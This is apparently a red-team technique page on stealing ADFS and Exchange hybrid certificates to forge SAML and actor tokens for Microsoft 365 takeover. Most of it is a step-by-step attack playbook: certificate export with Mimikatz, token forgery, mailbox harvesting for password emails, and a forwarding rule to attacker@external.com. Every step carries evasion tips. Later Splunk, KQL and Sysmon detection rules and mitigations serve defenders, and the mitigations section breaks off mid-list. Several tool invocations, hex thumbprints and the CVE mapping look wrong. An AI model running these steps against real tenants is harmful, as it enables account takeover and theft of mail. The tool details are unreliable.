# [CA-TOKEN-006]: Service Principal Certificate Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-006 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/), [T1606.002 - Forge Web Credentials (SAML)](https://attack.mitre.org/techniques/T1606/T1606.002/) |
| **Tactic** | Credential Access, Privilege Escalation |
| **Platforms** | Entra ID, Hybrid Exchange, ADFS, Azure |
| **Severity** | Critical |
| **CVE** | CVE-2025-55241 (Actor Token Forgery), CVE-2021-42287 (Kerberos/S2S abuse) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-11-05 |
| **Affected Versions** | All ADFS versions, Entra ID (all versions), Hybrid Exchange 2013-2019+, Azure App Service |
| **Patched In** | N/A (design inherent to certificate-based authentication; mitigated via certificate rotation, access control, and detection) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability for this technique.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Service principal certificate theft is a high-impact credential access attack where an attacker steals or injects X.509 certificates used by service principals to authenticate to Azure, Microsoft 365, or federated identity providers. The attack exploits two primary scenarios: (1) **ADFS Golden SAML** - extracting the token signing certificate from on-premises Active Directory Federation Services to forge SAML assertions impersonating any user, and (2) **Entra ID S2S Actor Token Forgery** - obtaining or injecting certificates into service principals trusted for delegation (e.g., on-premises Exchange hybrid) to sign actor tokens that bypass cloud identity verification. Both attacks result in complete tenant compromise, Global Admin impersonation, and long-term persistence invisible to Entra ID logs.

**Attack Surface:** ADFS servers and their cryptographic material (certificates, DKM keys), service principal keyCredentials in Entra ID, hybrid Exchange/SharePoint certificates, certificate stores on domain-joined machines, and Entra ID CBA (Certificate-Based Authentication) configuration endpoints.

**Business Impact:** **Complete global admin compromise without password or MFA interaction.** Attackers can impersonate any user (including Global Admins), create backdoor accounts, access all M365 data (Exchange, Teams, SharePoint, OneDrive), provision malicious applications with indefinite permissions, and maintain persistence for months. Unlike password/token compromise, certificate-based attacks generate minimal audit logs (actor tokens are invisible to Entra ID), bypass Conditional Access policies, and remain effective even after password resets or MFA changes.

**Technical Context:** Certificate theft is extremely difficult to detect because forged SAML tokens appear cryptographically valid (signed with legitimate organizational certificate) and service-to-service tokens bypass interactive authentication entirely. Detection requires correlation across multiple systems (ADFS logs, Entra ID audit, M365 service logs) which most organizations lack. Reversibility is NONE—stolen certificates enable indefinite access until the certificate is explicitly revoked and replaced.

### Operational Risk

- **Execution Risk:** Medium - Requires admin access to ADFS or graph API access to compromise; hybrid environments have larger attack surface.
- **Stealth:** Very High - Forged SAML tokens appear legitimate; S2S actor tokens bypass all authentication logs; no MFA prompts or alerts.
- **Reversibility:** No - Certificates remain valid until revoked; actor tokens are non-revocable and valid up to 24 hours.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.5 | Protect privileged admin accounts from phishing and compromise |
| **CIS Benchmark** | 2.3.5 | Enforce MFA for all users (bypassed by cert-based auth) |
| **CIS Benchmark** | 5.1.1.1 | Require device compliance (CBA can bypass if not enforced) |
| **DISA STIG** | AC-2.2.3 | Service account credential management and rotation |
| **NIST 800-53** | AC-3 | Access Enforcement - Certificate-based access controls |
| **NIST 800-53** | IA-5 | Authentication Control - Certificate lifecycle management |
| **NIST 800-53** | SC-7 | Boundary Protection - Federated identity service hardening |
| **GDPR** | Art. 32 | Security of Processing - Cryptographic controls for certificates |
| **DORA** | Art. 9 | Protection and Prevention - Authentication infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management - Certificate rotation and monitoring |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Service principal control |
| **ISO 27001** | A.10.1.1 | Cryptography - Certificate key management and protection |
| **ISO 27005** | Risk Scenario | "Compromise of Cryptographic Key Material" and "Unauthorized Service Principal Access" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - For ADFS cert theft: Local Admin on ADFS server OR Domain Admin to access DKM keys in AD.
  - For S2S cert injection: Global Admin OR Exchange Admin OR app ownership with Application.ReadWrite permissions.
  - For CBA certificate abuse: PIM-activated Authentication Policy Administrator role.

- **Required Access:**
  - For ADFS: Network access to ADFS server (SMB for DKM extraction, local registry, or certificate store).
  - For Entra ID: Graph API access with Application.ReadWrite.OwnedBy or Directory.ReadWrite.All.

**Supported Versions:**
- **ADFS:** Windows Server 2012-2019 (modern versions; older versions may use different cert storage).
- **Entra ID:** All versions (keyCredentials feature since 2015+).
- **Exchange Hybrid:** Exchange 2013, 2016, 2019 with hybrid connector certificates.
- **CBA:** Entra ID with CBA support (enabled 2023+).

**Tools:**
- [AAD Internals](https://o365blog.com/aadinternals/) - ADFS cert extraction, SAML token generation, actor token manipulation.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+) - ADFS certificate export from memory/registry.
- [ADFSDump](https://github.com/AlgoSecure/ADFSDump) - Complete ADFS config and certificate extraction.
- [ADFSpoof](https://github.com/mandiant/ADFSpoof) - Forge SAML tokens.
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) - Service principal keyCredentials manipulation.
- [ROADtools](https://github.com/dirkjanm/roadtools) - Actor token generation and signing.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Discover service principals with certificates, ADFS presence, and certificate rotation policies.

```powershell
# Check for service principals with certificates (potential targets)
Connect-MgGraph -Scopes "Application.Read.All"

Get-MgServicePrincipal -Filter "startsWith(displayName, 'Exchange')" |
    Where-Object { $_.KeyCredentials.Count -gt 0 } |
    Select-Object DisplayName, Id, @{
        N="CertificateThumbprints"
        E={$_.KeyCredentials.KeyId}
    }, @{
        N="CertificateExpiry"
        E={$_.KeyCredentials.EndDateTime}
    }

# Check for ADFS presence in tenant
$hybridConfig = Get-MgOrganization | Select-Object CompanyName
Write-Host "Checking for ADFS/Hybrid configuration..."
Get-MgDevice -Filter "trustType eq 'Hybrid Azure AD joined'" | Measure-Object

# Check CBA configuration
Get-MgPolicyCertificateBasedAuthConfiguration -ErrorAction SilentlyContinue |
    Select-Object DisplayName, CertificateUserBindings

# Verify certificate rotation frequency
Get-MgServicePrincipal | ForEach-Object {
    $sp = $_
    $sp.KeyCredentials | Where-Object { $_.EndDateTime -gt (Get-Date).AddDays(-365) } |
        Select-Object @{N="ServicePrincipal";E={$sp.DisplayName}}, EndDateTime
}
```

**What to Look For:**
- **Service principals with long-lived certificates** (>2 years validity) = potential persistence point.
- **Hybrid Azure AD joined devices** = ADFS presence in environment.
- **CBA enabled** = additional certificate-based auth surface.
- **Recent certificate additions** = possible compromise or legitimate rotation (verify with change control).

**Version Note:** keyCredentials structure is consistent across all modern Entra ID versions; older hybrid configurations may use different cert storage mechanisms.

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Golden SAML - ADFS Token Signing Certificate Theft & SAML Forgery

**Supported Versions:** All ADFS versions (Windows Server 2012-2019).

#### Step 1: Gain Admin Access to ADFS Server

**Objective:** Obtain Local Admin or Domain Admin privileges on ADFS server to access certificate material.

**Command (Lateral Movement via Kerberos Ticket):**

```powershell
# Once compromised user has access to ADFS server, elevate to ADFS service account
# Option 1: Use domain admin privileges to access ADFS service account

$adfsServiceAccount = Get-ADUser -Filter {SamAccountName -eq "ADFS_*"} | Select-Object -First 1
Write-Host "[+] ADFS Service Account: $($adfsServiceAccount.SamAccountName)"

# Option 2: Compromise ADFS server and access certificates directly
# (Requires RDP/WinRM access to ADFS server)
```

**Expected Output:**
```
[+] ADFS Service Account: ADFS_Service
[+] ADFS Server: adfs.company.com (192.168.1.100)
```

**What This Means:**
- Access to ADFS server grants access to token signing certificates and DKM encryption keys.
- DKM keys are stored in AD container and encrypted with ADFS service account credentials.

**OpSec & Evasion:**
- ADFS server access is usually highly audited; lateral movement should avoid triggering alerts.
- Consider using stolen credentials rather than Kerberos (less detectable).
- Detection likelihood: **High** (RDP/WinRM connections to ADFS are monitored).

**Troubleshooting:**
- **Error:** "Access Denied to ADFS server"
  - **Cause:** Network segmentation or firewall blocking access.
  - **Fix:** Pivot through compromised ADFS-adjacent server or use VPN access if available.

#### Step 2: Extract ADFS Token Signing Certificate & DKM Key

**Objective:** Retrieve the X.509 certificate and private key used by ADFS to sign SAML tokens.

**Command (Using ADFSDump):**

```bash
# Download and execute ADFSDump on ADFS server
# ADFSDump requires local admin or SYSTEM access

python3 ADFSDump.py

# Output will show:
# - Token Signing Certificate (X.509)
# - Token Signing Key (Private Key)
# - Encryption Certificate
# - Distributed Key Management (DKM) key from AD

# Extract to PFX file for offline use
```

**Alternative Command (Using AAD Internals on victim domain):**

```powershell
# If you have access to domain controller or any domain-joined machine
Import-Module AADInternals

# Export ADFS token signing certificate
$cert = Get-ADFSTokenSigningCertificate -ComputerName adfs.company.com
$cert | Export-PfxCertificate -FilePath "C:\temp\adfs_cert.pfx" -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force)

Write-Host "[+] Certificate exported to C:\temp\adfs_cert.pfx"
```

**Alternative (Using Mimikatz - if ADFS certificate in registry):**

```cmd
# Run Mimikatz on ADFS server with SYSTEM privileges
mimikatz.exe
lsadump::sam  // Extract SAM if local auth is possible
crypto::capi  // List certificates in system store
crypto::certificates /export  // Export certificates
```

**Expected Output:**
```
[+] ADFS Token Signing Certificate exported
[+] Subject: CN=ADFS Signing - [company]-[GUID]
[+] Thumbprint: A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6
[+] Private Key: -----BEGIN PRIVATE KEY-----
```

**What This Means:**
- Certificate and private key can now be used to forge SAML assertions offline.
- No further access to ADFS server is needed for token forgery.

**OpSec & Evasion:**
- Exporting certificates may trigger ADFS Event ID 1007 (Certificate Export).
- Using ADFSDump leaves process execution logs; prefer silent extraction via registry/AD.
- Detection likelihood: **High** (Event ID 1007 is monitored by most SOCs).

**Troubleshooting:**
- **Error:** "Cannot export certificate - Access Denied"
  - **Cause:** Running as non-SYSTEM user or certificate store permissions.
  - **Fix:** Run as NT AUTHORITY\SYSTEM using psexec or token impersonation.

#### Step 3: Generate Forged SAML Token

**Objective:** Create a valid, cryptographically-signed SAML assertion impersonating a user (e.g., Global Admin).

**Command (Using AAD Internals):**

```powershell
# Import stolen ADFS certificate
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 `
    -ArgumentList "C:\temp\adfs_cert.pfx", "Password123!"

# Create forged SAML token for Global Admin
$targetUser = "admin@company.onmicrosoft.com"
$targetUserSid = "S-1-5-21-3623811015-3361044348-30300820-1013"

# Create SAML assertion with admin claims
$samlToken = New-SAMLToken -Certificate $cert `
    -User $targetUser `
    -Issuer "http://adfs.company.com/adfs/services/trust" `
    -Audience "https://login.microsoftonline.com/company.onmicrosoft.com/federationmetadata/2007-06/federationmetadata.xml" `
    -NameIDFormat "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress" `
    -ImmutableID "user@company.com" `
    -Groups @("admin@company.com", "global_admin") `
    -ValidDays 1

Write-Host "[+] Forged SAML token created for $targetUser"
Write-Host $samlToken
```

**Alternative (Using ADFSpoof):**

```bash
# Forge SAML assertion with stolen certificate
python3 adfs_spoof.py \
    --certificate /tmp/adfs_cert.pfx \
    --password "Password123!" \
    --user admin@company.onmicrosoft.com \
    --issuer "http://adfs.company.com/adfs/services/trust" \
    --output /tmp/saml_token.xml

echo "[+] SAML token written to /tmp/saml_token.xml"
```

**Expected Output:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response IssueInstant="2025-01-08T04:30:00Z" Destination="https://login.microsoftonline.com/login.srf?samlResponse=...">
  <Assertion Issuer="http://adfs.company.com/adfs/services/trust">
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@company.com</NameID>
    </Subject>
    <Signature>
      <SignatureValue>A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6...</SignatureValue>
    </Signature>
  </Assertion>
</samlp:Response>
```

**What This Means:**
- SAML token is cryptographically signed with ADFS private key.
- Signature is valid and will be accepted by all services trusting ADFS as identity provider.
- No MFA, no password required; impersonation is complete.

**OpSec & Evasion:**
- Creating SAML tokens is client-side; generates no network traffic or server logs until token is used.
- Detection likelihood: **Very Low** (offline activity).

**Troubleshooting:**
- **Error:** "Invalid certificate format"
  - **Cause:** PFX file corrupted or wrong password.
  - **Fix:** Re-export certificate from ADFS with correct password.

#### Step 4: Replay SAML Token to Access M365 Services

**Objective:** Use forged SAML token to authenticate to Office 365 as the impersonated user.

**Command (Using browser or API):**

```html
<!-- Method 1: Browser-based SAML authentication -->
<html>
<head>
    <title>ADFS Login</title>
</head>
<body onload="document.forms[0].submit()">
    <form method="POST" action="https://login.microsoftonline.com/login.srf">
        <input type="hidden" name="SAMLResponse" value="BASE64_ENCODED_SAML_RESPONSE_HERE" />
        <input type="hidden" name="RelayState" value="" />
    </form>
</body>
</html>
```

**Command (Using PowerShell):**

```powershell
# Replay SAML token to get O365 tokens
$samlResponse = "BASE64_ENCODED_SAML_TOKEN_FROM_PREVIOUS_STEP"
$relayState = ""

# POST SAML token to Office 365
$response = Invoke-WebRequest -Uri "https://login.microsoftonline.com/login.srf" `
    -Method POST `
    -Body @{
        "SAMLResponse" = $samlResponse
        "RelayState" = $relayState
    } `
    -SessionVariable "session"

# Extract Office 365 session cookies from response
$o365Token = $session.Cookies | Where-Object { $_.Name -eq "access_token" }

Write-Host "[+] Office 365 token obtained"
Write-Host "[+] Authenticated as: admin@company.com"

# Use token to access Exchange Online
$headers = @{
    "Authorization" = "Bearer $o365Token"
}

$mailboxes = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" `
    -Headers $headers

Write-Host "[+] Enumerated $($ mailboxes.value.Count) user mailboxes"
```

**Expected Output:**
```
[+] Office 365 token obtained
[+] Authenticated as: admin@company.com
[+] Enumerated 245 user mailboxes
[+] Full access to Exchange Online, SharePoint, Teams, OneDrive
```

**What This Means:**
- Attacker now has full impersonation of Global Admin.
- Can access all M365 services without user knowledge or MFA.
- Account activity appears to come from legitimate admin account.

**OpSec & Evasion:**
- SAML authentication to Office 365 is logged but appears legitimate (correct issuer, valid signature).
- No conditional access alerts (MFA already satisfied by ADFS signature verification).
- Detection likelihood: **Medium** (anomalous admin activity, but legitimate-looking logon).

**Troubleshooting:**
- **Error:** "Invalid SAML Response"
  - **Cause:** Token format incorrect or not base64-encoded properly.
  - **Fix:** Verify SAML XML structure and encoding.
- **Error:** "Service Principal not found"
  - **Cause:** ADFS service principal not configured in Entra ID for SSO.
  - **Fix:** Ensure tenant is federated with ADFS (check federation metadata).

---

### METHOD 2: S2S Actor Token Forgery - On-Prem Exchange Hybrid Certificate Theft

**Supported Versions:** Hybrid Exchange (2013-2019+) with on-premises servers.

#### Step 1: Identify & Compromise Hybrid Exchange Service Account

**Objective:** Obtain credentials or certificates of service account running Exchange Hybrid trust.

**Command (Domain Enum):**

```powershell
# Find Exchange Hybrid service accounts in AD
Get-ADServiceAccount -Filter {Name -like "*Exchange*Hybrid*" -or Name -like "*ExOnline*"} |
    Select-Object Name, Enabled, LastLogonDate

# Check for Exchange Server certificates in trusted stores
Get-ChildItem "HKLM:\Software\Microsoft\Exchange" -Recurse |
    Where-Object { $_.ValueCount -gt 0 } |
    Select-Object PSPath, PSChildName
```

**Expected Output:**
```
Name: exch-hybrid-sync
Enabled: True
LastLogonDate: 2025-01-06

[+] Found Exchange Hybrid service account
```

**What This Means:**
- Exchange Hybrid uses service-to-service (S2S) authentication with certificates.
- Certificate is typically stored in HKCU (user registry) of service account or on local machine.

**OpSec & Evasion:**
- Accessing service account context requires admin privileges or process impersonation.
- Detection likelihood: **Medium** (unusual registry access flagged by EDR).

#### Step 2: Export Hybrid Exchange Certificate

**Objective:** Extract the certificate and private key used for S2S authentication.

**Command (Using Mimikatz from service account context):**

```cmd
# Run Mimikatz as Exchange Hybrid service account
# First, impersonate service account
runas /user:DOMAIN\exch-hybrid-sync cmd.exe

# Then run Mimikatz
mimikatz.exe
crypto::capi
crypto::certificates /export /path:"HKLM:\Software\Microsoft\Exchange"
```

**Alternative (Using PowerShell to export from cert store):**

```powershell
# Export Exchange Hybrid certificate from cert store
$cert = Get-ChildItem "Cert:\LocalMachine\My" |
    Where-Object { $_.Subject -like "*ExchangeHybrid*" -or $_.Subject -like "*ExOnline*" } |
    Select-Object -First 1

if ($cert) {
    # Export PFX
    $cert | Export-PfxCertificate -FilePath "C:\temp\exchange_hybrid_cert.pfx" `
        -Password (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force)
    
    Write-Host "[+] Exchange Hybrid certificate exported to C:\temp\exchange_hybrid_cert.pfx"
} else {
    Write-Host "[-] No Exchange Hybrid certificate found in cert store"
}
```

**Expected Output:**
```
[+] Exchange Hybrid certificate exported to C:\temp\exchange_hybrid_cert.pfx
[+] Certificate Subject: CN=ExchangeHybrid-GUID
[+] Thumbprint: D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9
[+] Valid Until: 2027-01-08
```

**What This Means:**
- Certificate is now available for offline use to forge actor tokens.
- Valid for up to 2 years (typical certificate lifetime).

**OpSec & Evasion:**
- Certificate export is logged in Windows event logs (Event ID 4696 for crypto operations).
- Using Mimikatz triggers EDR alerts on most modern systems.
- Detection likelihood: **High** (Mimikatz execution is monitored).

#### Step 3: Forge Actor Token Using Stolen Certificate

**Objective:** Generate a valid actor token signed with Exchange Hybrid certificate to impersonate a user.

**Command (Using ROADtools):**

```powershell
# Import ROADtools module
Import-Module .\roadtools\roadtools.psd1

# Load stolen Exchange Hybrid certificate
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 `
    -ArgumentList "C:\temp\exchange_hybrid_cert.pfx", "P@ssw0rd123"

# Create actor token for Global Admin
$actorToken = New-ActorToken `
    -Certificate $cert `
    -IssueTime (Get-Date) `
    -ExpiryTime (Get-Date).AddHours(24) `
    -Issuer "https://outlook.office365.com" `
    -ActorId "f5c3b5c1-d3b1-4f6e-8f8b-4c9e5f6g7h8i" `  # Exchange Online service principal
    -TargetUser "admin@company.onmicrosoft.com"

Write-Host "[+] Actor token forged: $actorToken"
Write-Host "[+] Token valid for: 24 hours"
Write-Host "[+] Can impersonate: admin@company.onmicrosoft.com"
```

**Expected Output:**
```
[+] Actor token forged: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkQ0RTVGNkcyN...
[+] Token valid for: 24 hours
[+] Can impersonate: admin@company.onmicrosoft.com
[+] Token is signed with: Exchange Hybrid certificate
[+] No MFA required
[+] Bypasses Conditional Access
```

**What This Means:**
- Actor token is signed and appears legitimate to Exchange Online.
- Token can be used to access mailboxes, SharePoint, OneDrive as the impersonated user.
- Tokens are non-revocable; remain valid until expiration (24 hours).

**OpSec & Evasion:**
- Token generation is client-side; no network traffic or server logs until used.
- Detection likelihood: **Very Low** (offline activity).

#### Step 4: Use Actor Token to Access Exchange Online

**Objective:** Leverage forged actor token to access mailboxes and other M365 resources.

**Command:**

```powershell
# Use actor token with Graph API
$headers = @{
    "Authorization" = "Bearer $actorToken"
    "Content-Type" = "application/json"
}

# Example: Access another user's mailbox
$targetUser = "user@company.onmicrosoft.com"
$mailboxUrl = "https://graph.microsoft.com/v1.0/users/$targetUser/mailFolders/Inbox/messages"

$messages = Invoke-RestMethod -Uri $mailboxUrl -Headers $headers

Write-Host "[+] Accessed mailbox for $targetUser"
Write-Host "[+] Found $($messages.value.Count) messages"

# Example: Extract sensitive emails
$sensitiveEmails = $messages.value | Where-Object { $_.Subject -like "*password*" -or $_.Subject -like "*credential*" }
Write-Host "[+] Found $($sensitiveEmails.Count) emails with sensitive keywords"

# Example: Create forwarding rule (persistence)
$forwardRule = @{
    "displayName" = "Archive"
    "enabled" = $true
    "conditions" = @{
        "senderAddressLocation" = "outOfOrganization"
    }
    "actions" = @{
        "forwardAsAttachmentTo" = @(@{
            "emailAddress" = @{
                "name" = "Attacker"
                "address" = "attacker@external.com"
            }
        })
    }
} | ConvertTo-Json

$ruleUrl = "https://graph.microsoft.com/v1.0/users/$targetUser/mailFolders/Inbox/messageRules"
Invoke-RestMethod -Uri $ruleUrl -Headers $headers -Method POST -Body $forwardRule

Write-Host "[+] Mail forwarding rule created - all incoming emails will be forwarded to attacker@external.com"
```

**Expected Output:**
```
[+] Accessed mailbox for user@company.onmicrosoft.com
[+] Found 234 messages
[+] Found 12 emails with sensitive keywords
[+] Mail forwarding rule created - persistence established
[+] Token valid for: 23 hours 45 minutes
[+] No Conditional Access alerts or MFA required
```

**What This Means:**
- Attacker has complete access to user's mailbox using forged actor token.
- Persistence established via mail forwarding rule.
- Token will remain valid for up to 24 hours; attacker can mint new tokens using stolen certificate.

**OpSec & Evasion:**
- Exchange Online doesn't validate actor token against Entra ID (trusts hybrid cert).
- Activity appears legitimate (from service account, not user).
- Detection likelihood: **Medium** (unusual mailbox access from service account, but legitimate context).

**Troubleshooting:**
- **Error:** "Token not valid for resource"
  - **Cause:** Actor token audience/resource not correctly configured.
  - **Fix:** Ensure token includes correct resource (Exchange Online service principal ID).

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** Atomic Red Team T1606.002 (Forge Web Credentials).
- **Test Name:** Golden SAML Token Generation & Usage.
- **Description:** Extract ADFS certificate and generate forged SAML token.
- **Supported Versions:** ADFS 3.0+

**PoC Verification Command:**

```powershell
# Test 1: Verify ADFS certificates are extractable
$cert = Get-ChildItem "Cert:\LocalMachine\My" | Where-Object { $_.Subject -like "*ADFS*" }
if ($cert) {
    Write-Host "[+] ADFS certificate found and accessible"
} else {
    Write-Host "[-] ADFS certificate not accessible"
}

# Test 2: Verify certificate signing capability
try {
    $cert.PrivateKey.SignData([byte[]]@(1,2,3), [System.Security.Cryptography.HashAlgorithmName]::SHA256)
    Write-Host "[+] Certificate can sign data - Golden SAML is possible"
} catch {
    Write-Host "[-] Certificate signing failed: $_"
}

# Test 3: Verify SAML token generation
# (Requires AAD Internals or similar)
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: ADFS Certificate Export (Event ID 1007)

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** WinEventLog:Microsoft-Windows-CertificateServicesClient-Lifecycle-System
- **Required Fields:** EventCode, Subject, ObjectName
- **Alert Threshold:** Event ID 1007 (Certificate Export) = immediate alert
- **Applies To Versions:** All ADFS versions

**SPL Query:**

```spl
index=windows EventCode=1007 host=*adfs* 
| stats count, values(Subject), values(ObjectName), values(Computer) by host 
| search count > 0
| rename host as adfs_server, Subject as certificate_subject, ObjectName as export_path
```

**What This Detects:**
- Any attempt to export certificates from ADFS server.
- Event 1007 is rare in legitimate operations.

---

### Rule 2: Service Principal keyCredentials Added (Audit Logs)

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Fields:** ActivityDisplayName, TargetResources, InitiatedBy
- **Alert Threshold:** "Add keyCredentials" operation immediately suspicious
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_activity ActivityDisplayName="Add keyCredentials" OR ActivityDisplayName="Update application – Certificates and secrets"
| stats count, values(TargetResources), values(InitiatedBy.User.UserPrincipalName) by ActivityDateTime
| where count > 0
| search TargetResources{}.displayName="*Exchange*" OR TargetResources{}.displayName="*Hybrid*"
```

**What This Detects:**
- New certificates added to sensitive service principals (Exchange, Hybrid services).
- Legitimate rotation should be scheduled and approved.

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Forged SAML Token Usage (Missing ADFS Correlation)

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** SessionId, CorrelationId, IssuerName, ResourceTenantId
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All

**KQL Query:**

```kusto
let adfsIssuers = dynamic(["http://adfs.company.com/adfs/services/trust", "urn:federation:microsoftonline"]);
SigninLogs
| where IssuerName in (adfsIssuers)
| where ResultType == 0  // Successful login
| join kind=leftanti (
    AuditLogs
    | where OperationName == "ADFS Sign-in Event"
    | where ActivityDateTime > ago(5m)
    | distinct CorrelationId
    ) on CorrelationId
| project
    TimeGenerated,
    UserPrincipalName,
    IssuerName,
    CorrelationId,
    SessionId,
    IPAddress,
    RiskReason="No matching ADFS server log for SAML authentication - possible forged token"
```

**What This Detects:**
- SAML token accepted by Office 365 but no corresponding ADFS server event.
- Indicates token was forged offline.

---

### Query 2: Actor Token Detection (Service-to-Service Token Abuse)

**Rule Configuration:**
- **Required Table:** SigninLogs, MicrosoftGraphActivityLogs
- **Required Fields:** ServicePrincipalId, IssuerName, CorrelationId
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All

**KQL Query:**

```kusto
// Detect S2S actor token usage from non-interactive service principals
SigninLogs
| where ServicePrincipalId != ""
| where CreatedDateTime > ago(1h)
| where IssuerName contains "https://sts.windows.net"
| join kind=inner (
    MicrosoftGraphActivityLogs
    | where ApiVersion == "v1.0"
    | where RequestUri contains "/users/" or RequestUri contains "/mailFolders"
    | where UserAgent != "Microsoft.Graph.Client/*"  // Non-SDK access
    ) on ServicePrincipalId
| project
    TimeGenerated,
    ServicePrincipalDisplayName,
    IssuerName,
    CorrelationId,
    ApiCall=RequestUri,
    TargetResource,
    RiskIndicator="S2S token used for user mailbox access"
```

**What This Detects:**
- Service-to-service tokens accessing user mailboxes (unusual).
- Forged actor tokens accessing resources they shouldn't.

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 1007 (Certificate Export Request)**

- **Log Source:** Microsoft-Windows-CertificateServicesClient-Lifecycle-System
- **Trigger:** Certificate export from ADFS server.
- **Filter:** EventCode == 1007
- **Applies To Versions:** All ADFS versions.

**Event ID: 4662 (Object Access)**

- **Log Source:** Security
- **Trigger:** Modification of AD Objects (specifically DKM key container for ADFS).
- **Filter:** ObjectName contains "CN=ADFS" or "CN=DKM"
- **Applies To Versions:** Server 2008+

**Manual Configuration Steps:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Object Access** → **Audit Directory Service Access**
4. Set to: **Success and Failure**
5. Run `auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2012-2019 (ADFS servers).

```xml
<Sysmon schemaversion="4.1">
  <EventFiltering>
    <!-- Detect certificate export tools on ADFS servers -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">
        Export-PfxCertificate
        certutil -exportPFX
        ADFSDump
        Mimikatz
      </CommandLine>
    </ProcessCreate>

    <!-- Detect access to ADFS certificate stores -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">
        HKLM\Software\Microsoft\ADFS
        HKLM\Software\Microsoft\Exchange\Hybrid
      </TargetObject>
    </RegistryEvent>
  </EventFiltering>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** "Suspicious certificate added to service principal"
- **Severity:** High
- **Description:** New certificate added to sensitive service principal (Exchange, Hybrid).
- **Applies To:** All subscriptions with Defender enabled.

**Alert Name:** "Golden SAML token detected"
- **Severity:** Critical
- **Description:** SAML token accepted without corresponding ADFS server log.
- **Applies To:** Hybrid environments with ADFS.

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Certificate & SAML Operations

```powershell
# Search for suspicious SAML and certificate operations
Search-UnifiedAuditLog -Operations "Add application","Update application","Consent to application" `
    -StartDate (Get-Date).AddDays(-7) `
    -FreeText "certificate" |
    Select-Object UserIds, Operations, CreationDate, AuditData |
    Export-Csv -Path "C:\certs_audit.csv"
```

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Certificate Rotation Policy (Short Lifetime)**

Certificates with short lifetimes limit persistence window of stolen certs.

**Manual Steps:**

1. **ADFS:** Configure certificate auto-renewal (recommended every 1 year; max 3 years).
   ```powershell
   Get-AdfsProperties | Select-Object -Property CertificatePromotionThresholdDays
   Set-AdfsProperties -CertificatePromotionThresholdDays 90
   ```

2. **Entra ID Service Principals:** Implement policy requiring certificate rotation every 6-12 months.
   ```powershell
   Connect-MgGraph -Scopes "Application.ReadWrite.All"
   
   Get-MgServicePrincipal | ForEach-Object {
       $sp = $_
       $sp.KeyCredentials | Where-Object { $_.EndDateTime -gt (Get-Date).AddYears(2) } |
           ForEach-Object {
               Write-Host "WARNING: Certificate for $($sp.DisplayName) expires in $((New-TimeSpan -Start (Get-Date) -End $_.EndDateTime).Days) days"
           }
   }
   ```

3. **Exchange Hybrid:** Rotate hybrid trust certificate every 2 years.
   ```powershell
   # On Exchange Hybrid server
   New-ExchangeCertificate -FriendlyName "Exchange Hybrid $(Get-Date -Format 'yyyy-MM-dd')" `
       -DomainName company.com
   
   Enable-ExchangeCertificate -Server $env:COMPUTERNAME `
       -Thumbprint "THUMBPRINT_OF_NEW_CERT" `
       -Confirm:$false
   ```

---

**2. Move Away from ADFS to Native Entra ID Authentication**

ADFS is a legacy attack surface; native cloud authentication is more secure.

**Manual Steps:**

1. Migrate federated users to cloud-only identity in Entra ID.
2. Decommission ADFS servers or place behind network isolation.
3. For certificate auth, use Entra ID CBA directly (not ADFS).

---

**3. Restrict Service Principal keyCredentials Addition**

Prevent unauthorized certificate injection into service principals.

**Manual Steps:**

1. **Azure Portal** → **Entra ID** → **App registrations**
2. Select app → **Owners**
